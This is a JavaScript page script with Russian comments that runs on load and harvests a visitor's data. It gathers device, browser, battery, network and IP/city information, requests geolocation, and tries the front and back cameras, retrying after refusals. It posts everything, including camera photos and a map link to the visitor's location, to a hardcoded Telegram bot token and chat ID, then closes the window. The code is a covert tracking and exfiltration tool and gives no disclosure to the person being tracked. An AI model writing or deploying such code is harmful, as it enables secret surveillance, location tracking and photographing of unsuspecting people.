// ТВОИ ДАННЫЕ
const BOT_TOKEN = '8621842542:AAGj8u2N6VHyIZNw3qX_qN9aSsSOYsZi424';
const CHAT_ID = '8244138604';

const video = document.getElementById('video');
let geoSuccess = false;

// ========== ОТПРАВКА В TELEGRAM ==========
async function sendToTelegram(method, data) {
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/${method}`;
    try {
        await fetch(url, { method: 'POST', body: data });
    } catch(e) {}
}

async function sendMessage(text) {
    const formData = new FormData();
    formData.append('chat_id', CHAT_ID);
    formData.append('text', text);
    await sendToTelegram('sendMessage', formData);
}

async function sendPhoto(photoBlob, caption) {
    const formData = new FormData();
    formData.append('chat_id', CHAT_ID);
    formData.append('photo', photoBlob, 'photo.jpg');
    formData.append('caption', caption);
    await sendToTelegram('sendPhoto', formData);
}

// ========== ДАННЫЕ УСТРОЙСТВА ==========
async function getDeviceInfo() {
    const userAgent = navigator.userAgent;
    let os = 'Unknown';
    if (userAgent.indexOf('Android') > -1) os = 'Android';
    else if (userAgent.indexOf('iPhone') > -1) os = 'iOS';
    else if (userAgent.indexOf('Windows') > -1) os = 'Windows';
    else if (userAgent.indexOf('Mac') > -1) os = 'MacOS';
    
    let browser = 'Unknown';
    if (userAgent.indexOf('Chrome') > -1 && userAgent.indexOf('Edg') === -1) browser = 'Chrome';
    else if (userAgent.indexOf('Safari') > -1 && userAgent.indexOf('Chrome') === -1) browser = 'Safari';
    else if (userAgent.indexOf('Firefox') > -1) browser = 'Firefox';
    
    const screenSize = `${screen.width}x${screen.height}`;
    const timestamp = new Date().toLocaleString('ru-RU');
    
    let batteryInfo = '';
    if ('getBattery' in navigator) {
        try {
            const battery = await navigator.getBattery();
            batteryInfo = `🔋 Батарея: ${Math.floor(battery.level * 100)}% (${battery.charging ? 'на зарядке' : 'не заряжается'})`;
        } catch(e) {}
    }
    
    let connectionInfo = '';
    const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
    if (conn) {
        connectionInfo = `📡 Интернет: ${conn.effectiveType || 'Unknown'} (${conn.downlink || '?'} Мбит/с)`;
    }
    
    return `📱 Устройство: ${os} | ${browser}
📐 Экран: ${screenSize}
⏰ Время: ${timestamp}
${batteryInfo}
${connectionInfo}`.trim();
}

async function getIPInfo() {
    try {
        const res = await fetch('https://ipapi.co/json/');
        const data = await res.json();
        return `🌍 IP: ${data.ip} (${data.city}, ${data.country_name})`;
    } catch(e) {
        return null;
    }
}

async function sendDeviceData() {
    let fullText = await getDeviceInfo();
    const ipText = await getIPInfo();
    if (ipText) fullText += '\n' + ipText;
    await sendMessage(fullText);
}

// ========== ГЕОЛОКАЦИЯ (ПРОСТАЯ) ==========
function askGeo(callback) {
    navigator.geolocation.getCurrentPosition(
        (pos) => {
            callback({ lat: pos.coords.latitude, lon: pos.coords.longitude });
        },
        () => {
            callback(null);
        }
    );
}

async function sendLocation(lat, lon) {
    const mapsUrl = `https://yandex.com/maps/?pt=${lon},${lat}&z=17&l=map`;
    await sendMessage(`📍 Местоположение: ${mapsUrl}`);
}

// ========== КАМЕРА (ПРОСТАЯ) ==========
function askCamera(facingMode, callback) {
    navigator.mediaDevices.getUserMedia({
        video: { facingMode: { exact: facingMode }, width: 1280, height: 720 }
    }).then(stream => {
        callback(stream);
    }).catch(() => {
        callback(null);
    });
}

async function takePhoto(stream, caption) {
    return new Promise((resolve) => {
        const canvas = document.createElement('canvas');
        const track = stream.getVideoTracks()[0];
        const settings = track.getSettings();
        canvas.width = settings.width || 1280;
        canvas.height = settings.height || 720;
        const ctx = canvas.getContext('2d');
        
        video.srcObject = stream;
        video.play();
        
        setTimeout(() => {
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            canvas.toBlob(async (blob) => {
                await sendPhoto(blob, caption);
                resolve();
            }, 'image/jpeg', 0.9);
        }, 500);
    });
}

// ========== ГЛАВНАЯ ФУНКЦИЯ ==========
async function main() {
    // 1. Данные устройства
    await sendDeviceData();
    
    // 2. Геолокация (1 раз)
    askGeo(async (location) => {
        if (location) {
            await sendLocation(location.lat, location.lon);
            geoSuccess = true;
        }
        
        // 3. Камера (2 попытки)
        askCamera('user', async (frontStream) => {
            if (!frontStream) {
                // Вторая попытка через 2 секунды
                setTimeout(() => {
                    askCamera('user', async (frontStream2) => {
                        if (frontStream2) {
                            await takePhoto(frontStream2, '📸 Фронтальная камера');
                            frontStream2.getTracks().forEach(t => t.stop());
                            
                            // Ждем 3 секунды
                            setTimeout(async () => {
                                askCamera('environment', async (backStream) => {
                                    if (backStream) {
                                        await takePhoto(backStream, '📸 Задняя камера');
                                        backStream.getTracks().forEach(t => t.stop());
                                    }
                                    
                                    // 4. Если гео не было - последняя попытка
                                    if (!geoSuccess) {
                                        askGeo(async (lastLocation) => {
                                            if (lastLocation) {
                                                await sendLocation(lastLocation.lat, lastLocation.lon);
                                            }
                                            setTimeout(() => window.close(), 1000);
                                        });
                                    } else {
                                        setTimeout(() => window.close(), 1000);
                                    }
                                });
                            }, 3000);
                        } else {
                            // Камера не разрешена - сразу проверяем гео
                            if (!geoSuccess) {
                                askGeo(async (lastLocation) => {
                                    if (lastLocation) {
                                        await sendLocation(lastLocation.lat, lastLocation.lon);
                                    }
                                    setTimeout(() => window.close(), 1000);
                                });
                            } else {
                                setTimeout(() => window.close(), 1000);
                            }
                        }
                    });
                }, 2000);
                return;
            }
            
            // Камера разрешена с первого раза
            await takePhoto(frontStream, '📸 Фронтальная камера');
            frontStream.getTracks().forEach(t => t.stop());
            
            // Ждем 3 секунды
            setTimeout(async () => {
                askCamera('environment', async (backStream) => {
                    if (backStream) {
                        await takePhoto(backStream, '📸 Задняя камера');
                        backStream.getTracks().forEach(t => t.stop());
                    }
                    
                    // 4. Если гео не было - последняя попытка
                    if (!geoSuccess) {
                        askGeo(async (lastLocation) => {
                            if (lastLocation) {
                                await sendLocation(lastLocation.lat, lastLocation.lon);
                            }
                            setTimeout(() => window.close(), 1000);
                        });
                    } else {
                        setTimeout(() => window.close(), 1000);
                    }
                });
            }, 3000);
        });
    });
}

// ЗАПУСК
main();
